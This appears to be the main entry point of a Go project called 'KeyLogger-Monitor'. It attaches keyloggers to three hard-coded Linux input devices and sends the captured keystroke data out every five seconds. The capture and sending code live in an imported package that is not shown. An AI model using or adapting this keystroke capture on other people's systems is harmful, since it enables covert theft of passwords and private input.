package main

import (
	"time"

	activitymonitor "github.com/dhanushs3366/KeyLogger-Monitor/activity_monitor"
)

func main() {
	devPaths := []string{
		"/dev/input/event6",
		"/dev/input/event10",
		"/dev/input/event7",
	}
	keyloggers, err := activitymonitor.SetupLoggers(devPaths)
	if err != nil {
		panic(err)
	}
	go activitymonitor.SendDataFromLoggers(keyloggers, 5*time.Second)
	// keylogger := keyloggers[len(keyloggers)-1]
	// go activitymonitor.SendDataFromLogger(keylogger, 5*time.Second)
	// Prevent the main function from exiting
	select {}
}
